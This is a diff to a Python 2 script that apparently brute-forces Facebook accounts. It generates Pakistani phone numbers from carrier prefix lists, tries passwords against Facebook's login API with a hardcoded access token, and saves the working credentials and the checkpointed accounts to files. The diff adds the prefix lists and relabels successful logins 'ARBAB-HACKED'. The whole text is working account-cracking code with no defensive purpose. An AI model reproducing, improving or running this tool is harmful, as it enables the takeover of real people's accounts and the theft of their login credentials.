@@ -241,7 +241,11 @@ def action():
 	elif bch =="11":
 		os.system("clear")
 		print (logo)
-		print("Jazz 300, 301, 302, 303, 04, 05, 06, 07, 08 ,09")
+		print("Jazz 300, 301, 302, 303, 304, 305, 306, 307, 308 ,309")
+		print("Zong 310, 311, 312, 313, 316, 315, 316, 317")
+		print("Telinor 340, 341, 342, 343, 344, 345, 346,")
+		print("Ufone 336, 334, 335, 334, 332, 331,")
+		print("Warid 320, 321, 322, 323, 324,")
 		try:
 			c = raw_input(" choose code  : ")
 			k="+92"
@@ -295,14 +299,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
+				print '\x1b[1;92mARBAB-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '[Checkpoint] ' + k + c + user + ' | ' + pass1+'\n'
+					print '[CHECKPOINT] ' + k + c + user + ' | ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
